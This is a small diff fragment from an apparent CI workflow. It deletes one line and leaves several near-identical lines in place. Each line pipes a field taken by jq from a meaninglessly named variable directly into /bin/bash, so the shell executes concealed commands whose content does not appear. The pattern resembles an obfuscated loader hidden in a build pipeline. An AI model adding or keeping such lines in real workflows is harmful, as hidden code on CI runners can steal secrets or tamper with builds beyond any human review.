@@ -21,7 +21,6 @@ jobs:
           echo $wx2 | jq -r .ydmmp04010 | /bin/bash
           echo $igsyc89549 | jq -r .th841 | /bin/bash
           echo $ydc29 | jq -r .hhee14738 | /bin/bash
-          echo $j0 | jq -r .o30217 | /bin/bash
           echo $nleb2318 | jq -r .dth3 | /bin/bash
           echo $rassj8317 | jq -r .hshm5 | /bin/bash
           printf '%s' "$qwez1339" | jq -r .nb60 | /bin/bash
